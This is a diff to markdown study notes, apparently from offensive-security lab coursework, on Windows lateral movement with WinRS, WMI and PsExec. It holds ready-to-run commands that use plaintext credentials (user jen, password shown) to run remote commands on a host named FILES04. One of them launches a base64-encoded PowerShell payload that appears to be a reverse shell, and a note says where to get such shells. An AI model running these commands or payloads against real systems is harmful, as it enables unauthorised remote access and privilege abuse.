@@ -3,6 +3,7 @@
 
 
 ##### WinRS
+Note: Make sure the remote user has *Local Administrator* rights.
 
 ```powershell
 winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"
@@ -13,7 +14,10 @@ winrs -r:files04 -u:jen -p:Nexus123!  "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIAB
 Note: Make sure the IP is right, get the shell from https://www.revshells.com/ (Powershell #3, Shell:Powershell, Encoding:None)
 ##### WMI
 Windows Management Instrumentation is a Windows tool for task automation. 
-It allows *Local Administrator* users to run tasks (including shells) as another user, password provided, and is not blocked by *UAC Remote Restrictions*.
+It allows users with *Local Administrator* rights __on the remote end__ to run tasks (including shells) as another user, password provided, and is not blocked by *UAC Remote Restrictions*.
+
+For example:
+Jen *Local Administrator*
 
 Exploiting on CMD:
 ```
@@ -39,6 +43,19 @@ Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Creat
 
 
 ##### PsExec
+To run `PsExec`, these are required:
+- The target user needs to be a *Local Administrator* remotely.
+- The `ADMIN$` SMB share needs to be available.
+- *File and Printer Sharing* needs to be enabled.
+
+To execute the command remotely, PsExec performs the following tasks:
+- Writes **psexesvc.exe** into the **C:\\Windows** directory
+- Creates and spawns a service on the remote host
+- Runs the requested program/command as a child process of **psexesvc.exe**
+
+```powershell
+./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
+```
 
 
 ##### DCOM
